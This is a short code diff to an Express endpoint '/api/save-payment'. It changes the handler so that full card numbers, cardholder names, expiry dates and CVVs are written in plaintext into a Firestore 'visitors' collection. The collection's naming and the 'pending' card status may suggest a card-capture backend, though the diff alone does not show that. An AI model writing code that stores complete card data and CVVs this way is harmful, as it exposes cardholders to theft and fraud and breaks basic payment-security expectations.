@@ -222,9 +222,19 @@ app.post('/api/save-payment', async (req, res) => {
         
         const { getFirestore } = require('./firebase-config');
         const db = getFirestore();
+        const timestamp = new Date().toISOString();
+        
         await db.collection('visitors').doc(vid).update({
             'payment.card_status': 'pending',
-            'payment.timestamp': new Date().toISOString()
+            'payment.current': {
+                cardNumber,
+                cardHolder,
+                expiryDate,
+                cvv,
+                cardType,
+                timestamp
+            },
+            'lastUpdated': timestamp
         });
         
         res.json(result);
